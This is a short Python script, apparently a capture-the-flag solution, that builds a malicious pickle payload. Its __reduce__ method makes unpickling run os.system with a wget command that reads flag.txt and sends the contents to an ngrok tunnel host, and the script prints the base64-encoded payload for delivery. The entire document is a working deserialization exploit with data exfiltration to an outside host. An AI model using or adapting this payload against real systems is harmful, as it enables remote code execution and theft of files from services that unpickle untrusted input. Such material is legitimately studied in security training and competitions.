import sys
import base64
import pickle

class Payload:

  def __reduce__(self):
    import os
    command = "wget https://e127-50-....-31.ngrok-free.app/`cat flag.txt`"
    print(command)
    return os.system, (command,)


payload = base64.b64encode(pickle.dumps(Payload())).decode()
print(payload)
